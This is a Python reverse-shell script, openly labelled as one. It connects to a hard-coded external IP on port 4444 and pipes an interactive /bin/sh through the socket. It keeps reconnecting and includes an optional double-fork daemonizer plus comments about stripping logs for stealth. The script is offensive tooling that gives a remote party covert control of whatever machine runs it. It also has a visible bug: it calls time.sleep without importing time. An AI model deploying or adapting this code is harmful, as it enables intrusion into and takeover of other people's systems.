#!/usr/bin/env python3
"""
TCP Reverse Shell

Author: Erik G.
Description:
    Establishes a reverse TCP connection to a specified remote host and port,
    providing the remote side with an interactive shell.
    Built for reliability, stealth, and maintainability.
"""

import logging
import socket
import subprocess
import os
import sys
import threading
import signal

# ---- Configuration ----
REMOTE_HOST = '172.58.48.212'   # Change to your remote server's IP
REMOTE_PORT = 4444              # Change to your listening port
RECONNECT_DELAY = 10            # Seconds before attempting to reconnect

# ---- Core Logic ----

def daemonize():
    """Detach from terminal and run in the background (simple double-fork)."""
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)
    sys.stdout.flush()
    sys.stderr.flush()
    with open('/dev/null', 'wb', 0) as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def handle_connection(sock):
    """Redirects shell I/O through the socket."""
    try:
        # Spawn a shell with redirected stdin/stdout/stderr
        p = subprocess.Popen(
            ["/bin/sh", "-i"],
            stdin=sock,
            stdout=sock,
            stderr=sock,
            shell=False,
            preexec_fn=os.setsid
        )
        p.wait()
    except Exception as e:
        # Log errors for debugging (optional, remove for stealth)
        # with open("/tmp/reverse_shell.log", "a") as log: log.write(str(e)+"\n")
        pass

def connect():
    """Attempt to connect to the remote server and spawn a shell."""
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(10)
                sock.connect((REMOTE_HOST, REMOTE_PORT))
                handle_connection(sock)
        except socket.error:
            pass
        except Exception:
            pass
        # Optional: Sleep before retrying
        time.sleep(RECONNECT_DELAY)

def sigchld_handler(signum, frame):
    """Reap zombie children."""
    try:
        while True:
            pid, _ = os.waitpid(-1, os.WNOHANG)
            if pid == 0:
                break
    except ChildProcessError:
        pass

if __name__ == "__main__":
    # Uncomment for stealth background execution
    # daemonize()
    signal.signal(signal.SIGCHLD, sigchld_handler)
    connect()
